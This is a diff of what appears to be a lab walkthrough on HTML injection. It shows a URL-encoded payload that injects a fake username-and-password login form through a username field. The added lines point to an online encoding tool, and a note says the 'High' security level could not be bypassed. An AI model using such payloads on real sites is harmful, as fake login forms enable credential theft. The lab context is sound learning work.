@@ -15,6 +15,8 @@ Below are the html form tags that should be entered in the username.
    ```
    %3Cform%20action%3D%22https%3A%2f%2fgoogle.com%22%3E%20%3Cinput%20type%3D%22text%22%20placeholder%3D%22Username%22%3E%3C%2fbr%3E%3C%2fbr%3E%20%3Cinput%20type%3D%22password%22%20placeholder%3D%22Password%22%3E%3C%2fbr%3E%3C%2fbr%3E%20%3Cinput%20type%3D%22submit%22%20value%3D%22Submit%22%3E%20%3C%2fform%3E
    ```
+   Use [this](https://gchq.github.io/CyberChef/) site for encoding helps :)
+   
 - Security-Level : High
 
     I can't think of a way to bypass the below code protection
